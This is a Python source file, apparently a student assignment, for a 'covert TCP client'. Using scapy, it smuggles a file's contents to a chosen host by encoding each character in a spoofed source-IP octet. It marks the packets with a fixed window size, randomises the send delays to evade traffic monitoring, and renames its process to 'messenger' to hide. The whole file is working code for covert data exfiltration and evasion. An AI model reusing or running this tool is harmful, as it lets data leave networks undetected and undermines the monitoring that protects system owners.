#!/usr/bin/python

#-----------------------------------------------------------------------------
#--	SOURCE FILE:	client.py -   Covert TCP Client
#--
#--	FUNCTIONS:		craft_packet(int)
#--					send_packet()
#--					main					
#--
#--	DATE:			September 28, 2015
#--
#--	DESIGNERS:		Brij Shah
#--
#--	PROGRAMMERS:	Brij Shah
#--
#--	NOTES:
#--	Client begins by aksing for a destination IP address and a message to be 
#-- sent. Each character in the message is converted into a number, then stored
#-- in the IP source field as the last octect of the IP. Each packet has a 
#-- specific TCP window size of '4096' for the server to recognize the crafted
#-- packets.
#-----------------------------------------------------------------------------

import sys
import os
import argparse
import time
import setproctitle
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

parser = argparse.ArgumentParser(description='Covert Channels')
parser.add_argument('-d', '--destination', dest='dest_ip', help='destination IP address', required=True)
parser.add_argument('-f', '--file', dest='file', help='file to send', required=True)
args = parser.parse_args()

with open (args.file, "r") as myfile:
	data = myfile.read()

#-----------------------------------------------------------------------------
#-- FUNCTION:       craft_packet(int)
#--
#-- VARIABLES(S):   int - the converted character to store in the src IP
#--
#-- NOTES:
#-- This method crafts a packet by taking in a number(which is the converted)
#-- character from the message. It then appends the number to last octect of
#-- the source IP and adds 10. It then changes the window size to 4096 and 
#-- changes the destination IP to the one specified by command line.
#-----------------------------------------------------------------------------
def craft_packet(int):
	global pkt
	pkt = IP(dst=args.dest_ip, src="192.168.0."+`int + 10`)/TCP(sport=RandNum(0, 65335), dport=8000, window=4096)
	return pkt

#-----------------------------------------------------------------------------
#-- FUNCTION:       send_packet()
#--
#-- NOTES:
#-- This method loops through each character of the message, converts it to
#-- a number and calls the craft_packet method to create a packet then sends
#-- it to the destination IP provided. Each packet is sent anywhere between
#-- 5 to 10 seconds to make it more obscure for someone monitoring traffic.
#-----------------------------------------------------------------------------
def send_packet():
	for char in data:
		num_char = ord(char)
		new_pkt = craft_packet(num_char)
		send(new_pkt)
		time.sleep(RandNum(5,10))

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#-- The pseudomain method that changes the process name of this application
#-- to 'messenger' to better mask the covert process. It then calls send_packet
#-- to send the message to the server.
#-----------------------------------------------------------------------------
def main():
	setproctitle.setproctitle("messenger")
	send_packet()

if __name__ == '__main__':
	main()